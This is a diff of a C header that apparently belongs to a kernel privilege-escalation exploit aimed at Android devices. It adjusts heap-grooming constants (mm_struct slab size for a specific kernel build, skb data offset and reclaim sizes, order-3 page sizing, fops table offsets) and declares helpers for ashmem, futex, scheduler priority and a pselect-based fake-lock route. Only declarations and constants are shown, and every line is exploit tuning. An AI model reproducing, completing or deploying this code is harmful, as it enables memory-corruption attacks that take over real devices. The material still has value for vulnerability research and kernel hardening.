@@ -43,13 +43,13 @@
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
-#define SKB_DATA_DELTA (-0xe78LL)
+#define SKB_DATA_DELTA (-0xe80LL)
 
 #define ASHMEM_NAME_LEN 256
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
-#define MM_STRUCT_SZ 0x400 /* mm_struct slab objsize on shennong 6.1.138 (/proc/slabinfo: objsize=1024 objperslab=32 pagesperslab=8=order3); NOT sizeof(struct)=0x3c0 */
+#define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
 #define MM_PARTIALS 5
 #define CORE 0
@@ -58,7 +58,6 @@
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
-#define SKB_RECLAIM_SIZE (ORDER3_SIZE - SKB_DATA_DELTA)
 #define SKB_RECLAIM_SENDS 4
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
@@ -341,7 +340,6 @@ long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
 long sched_setattr_tid(int tid, int nice_value);
-long sched_setattr_tid_rt(int tid, int rt_priority);
 int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
@@ -381,7 +379,8 @@ uintptr_t prepare_good_kernel_page(int payload_mode);
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
-void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex);
+void open_selected_fds(
+    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 
